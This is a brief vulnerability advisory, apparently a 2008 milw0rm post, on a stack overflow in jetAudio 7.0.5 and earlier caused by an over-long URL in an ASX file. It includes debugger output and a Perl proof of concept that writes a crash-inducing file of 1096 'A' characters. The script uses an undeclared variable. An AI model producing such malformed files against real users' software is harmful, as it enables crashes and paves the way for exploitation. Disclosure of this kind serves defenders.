@@ -1,0 +1,84 @@
+Application: jetAudio <= 7.0.5 (.ASX) Remote Stack Overflow
+Web Site: http://www.cowonamerica.com/download/
+Platform: Windows
+Bug:Remote Stack Overflow
+Extension: ASX
+special condition: none
+
+-------------------------------------------------------
+
+1) Introduction
+
+2) Bug
+
+3) Proof of concept
+
+4) Credits
+
+===========
+1) Introduction
+===========
+
+A nice introduction to jetaudio  can be found : http://www.cowonamerica.com/products/jetaudio/
+
+======
+2) Bug
+======
+
+When parsing an asx file with a long URL a stack overflow occurs.
+
+
+=====
+3)Proof of concept
+=====
+
+Proof of concept example :
+
+An url with 1096 A ( http://AAAAA....) will overwritte ESI and crash the program
+
+Here's the debugger output:
+Access violation - code c0000005
+
+eax=00000000 ebx=01187684 ecx=00000459 edx=0012d39c esi=41414141 edi=00000001
+
+eip=00441dad esp=0012cf3c ebp=00000001 iopl=0         nv up ei pl nz na po nc
+
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+
+JetAudio!CxImage::`copy constructor closure'+0x1109d:
+
+00441dad 8b06             mov     eax,[esi]         ds:0023:41414141=????????
+
+Here's the the Poc :
+
+
+#!/usr/local/bin/perl                                         
+                                                              
+use strict;                                                   
+                                                              
+use warnings;                                                 
+                                                              
+my $file="myfile.asx";                            
+                                                              
+my $payload = "A" x 1096;                                     
+                                                              
+open( $FILE, ">>$file") or die "Cannot open $file: $!";       
+                                                              
+print $FILE "http://".$payload;                               
+                                                              
+close($FILE);                                                 
+                                                              
+print "$file has been created \n";                            
+                                                              
+
+
+
+
+=====
+5)Credits
+=====
+
+laurent gaffié
+laurent.gaffie{remove_this}[at]gmail[dot]com
+
+# milw0rm.com [2008-02-08]
